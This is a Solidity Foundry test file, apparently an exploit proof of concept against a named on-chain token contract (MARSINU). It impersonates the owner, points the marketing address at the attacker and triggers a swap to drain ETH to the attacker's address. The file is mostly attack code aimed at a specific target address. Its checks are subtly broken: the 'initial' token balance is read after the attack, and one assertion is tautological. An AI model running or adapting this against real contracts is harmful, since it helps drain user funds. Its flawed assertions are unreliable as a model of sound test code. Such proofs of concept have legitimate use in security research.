// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Extended interface for MARSINU (removed duplicate interface)
interface MARSINU {
    function owner() external view returns (address);
    function prepareForPreSale() external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function excludeFromFee(address account) external;
    function uniswapV2Pair() external view returns (address);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use deal() if we need ETH for gas
        // but for this exploit we just need to impersonate the owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the owner address
        address owner = MARSINU(TARGET).owner();

        // Get contract address
        address tokenContract = TARGET;

        // Get uniswap pair address
        address uniswapV2Pair = MARSINU(TARGET).uniswapV2Pair();

        // Give contract some tokens (simulating accumulated fees from previous trades)
        // minimumTokensBeforeSwap is 200000 * 10**6 * 10**9 = 2e20
        uint256 minTokens = MARSINU(TARGET).minimumTokensBeforeSwapAmount();
        deal(tokenContract, tokenContract, minTokens * 2); // Give contract double the minimum

        // Record initial ETH balance of attacker
        uint256 initialEthBalance = address(attacker).balance;

        // Impersonate the owner
        vm.startPrank(owner);

        // Set marketing address to attacker
        MARSINU(TARGET).setMarketingAddress(attacker);

        // Enable swap and liquify
        MARSINU(TARGET).setSwapAndLiquifyEnabled(true);

        // We need to trigger swap by having contract transfer to uniswap pair
        // The swap happens when: !inSwapAndLiquify && swapAndLiquifyEnabled && to == uniswapV2Pair
        // and contractTokenBalance >= minimumTokensBeforeSwap
        // We can trigger this by having someone transfer to pair
        // Let's give some tokens to a random address and have it transfer to pair
        vm.stopPrank();

        // Give tokens to a helper address and have it transfer to pair
        address helper = address(0x123);
        deal(tokenContract, helper, 1000 * 10**9); // Small amount

        // Exclude helper from fee to avoid issues
        vm.prank(owner);
        MARSINU(TARGET).excludeFromFee(helper);

        // Helper transfers to uniswap pair (this should trigger swap)
        vm.prank(helper);
        MARSINU(TARGET).transfer(uniswapV2Pair, 1000 * 10**9);

        // Check if attacker received ETH
        uint256 finalEthBalance = address(attacker).balance;
        assertGt(finalEthBalance, initialEthBalance, "Attacker should receive ETH from swap");

        // Also check token balance increased if any tokens were bought back or sent to marketing address
        // (Marketing address might receive tokens directly in some cases)
        uint256 finalTokenBalance = MARSINU(TARGET).balanceOf(attacker);
        uint256 initialTokenBalance = MARSINU(TARGET).balanceOf(attacker);
        // Note: initialTokenBalance is 0, so any increase is good
        if (finalTokenBalance > 0) {
            assertGt(finalTokenBalance, 0, "Attacker token balance should increase");
        }
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
